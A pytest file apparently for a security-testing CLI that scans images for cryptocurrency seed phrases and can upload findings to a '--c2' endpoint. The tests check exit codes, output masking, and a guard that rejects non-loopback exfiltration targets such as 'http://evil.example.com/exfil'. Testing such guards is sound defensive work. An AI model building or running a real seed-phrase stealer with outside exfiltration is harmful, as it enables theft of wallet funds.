"""CLI 契约测试:退出码(自检脚本依赖)与 --mask 脱敏输出。"""

from pathlib import Path

import pytest

import mnestic.cli as cli
from mnestic.scan import Finding

VALID_12 = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"


def _finding(valid: bool) -> Finding:
    return Finding(image="/tmp/x.png", phrase=VALID_12, word_count=12, checksum_valid=valid)


@pytest.fixture
def scan_dir(tmp_path: Path) -> Path:
    from PIL import Image

    Image.new("RGB", (8, 8)).save(tmp_path / "a.png")
    return tmp_path


def _run(monkeypatch, tmp_path, findings, scan_dir, extra=()):
    monkeypatch.setattr(cli, "scan_directory", lambda *a, **k: findings)
    monkeypatch.setattr(cli, "exfiltrate", lambda *a, **k: {"ok": True, "count": len(findings)})
    db = tmp_path / "cli.db"
    return cli.main(["scan", str(scan_dir), "--db", str(db), *extra])


class TestExitCodes:
    def test_valid_mnemonic_exits_1(self, monkeypatch, tmp_path, scan_dir, capsys):
        assert _run(monkeypatch, tmp_path, [_finding(True)], scan_dir) == 1

    def test_no_findings_exits_0(self, monkeypatch, tmp_path, scan_dir):
        assert _run(monkeypatch, tmp_path, [], scan_dir) == 0

    def test_only_invalid_checksum_exits_0(self, monkeypatch, tmp_path, scan_dir):
        assert _run(monkeypatch, tmp_path, [_finding(False)], scan_dir) == 0

    def test_missing_directory_exits_2(self, tmp_path):
        assert cli.main(["scan", str(tmp_path / "nope"), "--db", str(tmp_path / "x.db")]) == 2

    def test_exfil_failure_exits_3(self, monkeypatch, tmp_path, scan_dir):
        monkeypatch.setattr(cli, "scan_directory", lambda *a, **k: [_finding(True)])

        def boom(*a, **k):
            raise RuntimeError("回传目标拒绝非回环地址")

        monkeypatch.setattr(cli, "exfiltrate", boom)
        code = cli.main(["scan", str(scan_dir), "--db", str(tmp_path / "x.db"),
                         "--c2", "http://127.0.0.1:1/exfil"])
        assert code == 3


class TestMask:
    def test_mask_keeps_only_first_last_word(self, monkeypatch, tmp_path, scan_dir, capsys):
        _run(monkeypatch, tmp_path, [_finding(True)], scan_dir, extra=("--mask",))
        out = capsys.readouterr().out
        assert "abandon " in out and " about" in out
        for word in VALID_12.split()[1:-1]:
            assert word not in out.replace("abandon", "")  # 中间词不得出现(除首词 abandon)

    def test_no_mask_prints_full_phrase(self, monkeypatch, tmp_path, scan_dir, capsys):
        _run(monkeypatch, tmp_path, [_finding(True)], scan_dir)
        assert VALID_12 in capsys.readouterr().out


class TestExfilLoopbackRedLine:
    def test_exfiltrate_rejects_non_loopback(self):
        from mnestic.c2 import exfiltrate

        with pytest.raises(RuntimeError, match="非回环"):
            exfiltrate("http://evil.example.com/exfil", [{"phrase": "x"}])
        with pytest.raises(RuntimeError, match="非回环"):
            exfiltrate("http://192.168.1.5:8765/exfil", [])

    def test_exfiltrate_allows_loopback(self):
        from mnestic.c2 import exfiltrate

        # 不发起请求,仅验证红线校验放行回环目标(连不上的端口走 URLError 而非 RuntimeError)
        import urllib.error

        with pytest.raises(urllib.error.URLError):
            exfiltrate("http://127.0.0.1:1/exfil", [], timeout=0.5)
